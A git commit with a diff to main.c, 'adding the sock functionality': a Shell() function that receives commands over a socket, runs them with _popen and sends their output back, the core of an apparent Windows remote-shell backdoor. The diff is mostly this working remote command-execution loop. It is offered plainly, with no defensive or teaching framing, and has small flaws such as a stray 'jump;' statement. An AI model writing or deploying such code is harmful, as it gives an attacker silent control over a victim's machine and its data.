a9122b0fa6b9704fcce37ebe46660de6d905a4dc
Amantsehay <amanueltsehay11@gmail.com>
2024-05-25 21:08:50 +0300

    adding the sock functionality

--- main.c
+++ main.c
@@ -10,15 +10,40 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 
+#define bzero(p, size) (void) memset((p), 0, (size));
+
+
 int sock;
+
+//Function to jump to the next line
+
 
 void Shell(){
     char buffer[1024];
     char container[1024];
     char total_response[18384];
-    
 
-
+    while (1){
+        jump;
+        bzero(buffer, sizeof(buffer));
+        bzero(container, sizeof(container));
+        bzero(total_response, sizeof(total_response));
+        recv(sock, buffer, 1024, 0);
+        if (strncmp("q", buffer, 1) == 0) {
+            // this means the client wants to quit
+            closesocket(sock);
+            WSACleanup();
+            exit(0);
+        }
+        else{
+            FILE *fp;
+            fp = _popen(buffer, "r");
+            while(fgets(container, 1024, fp) != NULL){
+                strcat(total_response, container);  
+            }
+            send(sock, total_response, sizeof(total_response), 0);
+        }
+    }
 
 
 }
